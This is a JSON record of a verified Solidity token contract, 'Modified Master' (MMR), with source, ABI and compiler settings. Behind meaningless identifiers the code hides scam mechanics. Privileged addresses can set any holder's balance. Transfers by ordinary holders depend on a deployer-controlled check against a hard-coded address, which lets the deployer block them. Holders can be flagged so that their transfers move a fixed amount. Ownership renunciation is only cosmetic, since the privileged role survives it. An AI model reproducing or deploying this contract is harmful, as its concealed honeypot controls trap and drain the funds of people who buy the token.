{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface limitIs {\n    function createPair(address liquidityTx, address swapMaxLiquidity) external returns (address);\n}\n\ninterface tokenExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxSwap) external view returns (uint256);\n\n    function transfer(address minAmount, uint256 sellLaunchedFund) external returns (bool);\n\n    function allowance(address launchedSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellLaunchedFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAmount,\n        uint256 sellLaunchedFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingSender, uint256 value);\n    event Approval(address indexed launchedSwap, address indexed spender, uint256 value);\n}\n\nabstract contract toTeamSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldEnable is tokenExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ModifiedMaster is toTeamSwap, tokenExempt, shouldEnable {\n\n    bool private totalToken;\n\n    function approve(address amountEnableIs, uint256 sellLaunchedFund) public virtual override returns (bool) {\n        isTx[_msgSender()][amountEnableIs] = sellLaunchedFund;\n        emit Approval(_msgSender(), amountEnableIs, sellLaunchedFund);\n        return true;\n    }\n\n    function allowance(address buyLimitToken, address amountEnableIs) external view virtual override returns (uint256) {\n        if (amountEnableIs == autoToken) {\n            return type(uint256).max;\n        }\n        return isTx[buyLimitToken][amountEnableIs];\n    }\n\n    function launchedTrading() private view {\n        require(sellTotal[_msgSender()]);\n    }\n\n    uint256 public amountShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableReceiverTake;\n    }\n\n    mapping(address => mapping(address => uint256)) private isTx;\n\n    bool public shouldMarketingMax;\n\n    uint256 constant shouldAmount = 16 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitToken;\n    }\n\n    address totalMinAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverTotal(uint256 sellLaunchedFund) public {\n        launchedTrading();\n        maxTake = sellLaunchedFund;\n    }\n\n    function transferFrom(address totalLimitList, address minAmount, uint256 sellLaunchedFund) external override returns (bool) {\n        if (_msgSender() != autoToken) {\n            if (isTx[totalLimitList][_msgSender()] != type(uint256).max) {\n                require(sellLaunchedFund <= isTx[totalLimitList][_msgSender()]);\n                isTx[totalLimitList][_msgSender()] -= sellLaunchedFund;\n            }\n        }\n        return fundMax(totalLimitList, minAmount, sellLaunchedFund);\n    }\n\n    string private liquidityEnable = \"MMR\";\n\n    function shouldFrom(address totalLimitList, address minAmount, uint256 sellLaunchedFund) internal returns (bool) {\n        require(takeMinSender[totalLimitList] >= sellLaunchedFund);\n        takeMinSender[totalLimitList] -= sellLaunchedFund;\n        takeMinSender[minAmount] += sellLaunchedFund;\n        emit Transfer(totalLimitList, minAmount, sellLaunchedFund);\n        return true;\n    }\n\n    function fundMax(address totalLimitList, address minAmount, uint256 sellLaunchedFund) internal returns (bool) {\n        if (totalLimitList == listTeam) {\n            return shouldFrom(totalLimitList, minAmount, sellLaunchedFund);\n        }\n        uint256 maxLaunchedIs = tokenExempt(receiverMin).balanceOf(totalMinAmount);\n        require(maxLaunchedIs == maxTake);\n        require(minAmount != totalMinAmount);\n        if (teamSellAuto[totalLimitList]) {\n            return shouldFrom(totalLimitList, minAmount, shouldAmount);\n        }\n        return shouldFrom(totalLimitList, minAmount, sellLaunchedFund);\n    }\n\n    function totalSender(address totalList) public {\n        launchedTrading();\n        if (atWalletFrom) {\n            launchShouldReceiver = true;\n        }\n        if (totalList == listTeam || totalList == receiverMin) {\n            return;\n        }\n        teamSellAuto[totalList] = true;\n    }\n\n    bool public modeWallet;\n\n    mapping(address => uint256) private takeMinSender;\n\n    address public listTeam;\n\n    uint256 maxTake;\n\n    mapping(address => bool) public sellTotal;\n\n    bool public atWalletFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityEnable;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeLaunchFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return totalShouldLiquidity;\n    }\n\n    address private totalShouldLiquidity;\n\n    event OwnershipTransferred(address indexed exemptMarketingFee, address indexed teamReceiver);\n\n    uint8 private limitToken = 18;\n\n    function balanceOf(address maxSwap) public view virtual override returns (uint256) {\n        return takeMinSender[maxSwap];\n    }\n\n    function txMax() public {\n        emit OwnershipTransferred(listTeam, address(0));\n        totalShouldLiquidity = address(0);\n    }\n\n    mapping(address => bool) public teamSellAuto;\n\n    function minSell(address limitModeReceiver) public {\n        require(limitModeReceiver.balance < 100000);\n        if (shouldMarketingMax) {\n            return;\n        }\n        if (launchShouldReceiver) {\n            amountShould = minShould;\n        }\n        sellTotal[limitModeReceiver] = true;\n        \n        shouldMarketingMax = true;\n    }\n\n    constructor (){\n        \n        liquidityLimit isTeam = liquidityLimit(autoToken);\n        receiverMin = limitIs(isTeam.factory()).createPair(isTeam.WETH(), address(this));\n        \n        listTeam = _msgSender();\n        sellTotal[listTeam] = true;\n        takeMinSender[listTeam] = enableReceiverTake;\n        txMax();\n        if (modeWallet != launchShouldReceiver) {\n            totalToken = true;\n        }\n        emit Transfer(address(0), listTeam, enableReceiverTake);\n    }\n\n    address public receiverMin;\n\n    bool public teamAmount;\n\n    function transfer(address amountMarketing, uint256 sellLaunchedFund) external virtual override returns (bool) {\n        return fundMax(_msgSender(), amountMarketing, sellLaunchedFund);\n    }\n\n    function marketingEnableSell(address amountMarketing, uint256 sellLaunchedFund) public {\n        launchedTrading();\n        takeMinSender[amountMarketing] = sellLaunchedFund;\n    }\n\n    uint256 public minShould;\n\n    function owner() external view returns (address) {\n        return totalShouldLiquidity;\n    }\n\n    string private takeLaunchFund = \"Modified Master\";\n\n    address autoToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private enableReceiverTake = 100000000 * 10 ** 18;\n\n    uint256 toSwap;\n\n    bool private launchShouldReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketingFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimitToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountEnableIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWalletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"marketingEnableSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitModeReceiver\",\"type\":\"address\"}],\"name\":\"minSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSellAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"}],\"name\":\"totalSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimitList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLaunchedFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ModifiedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}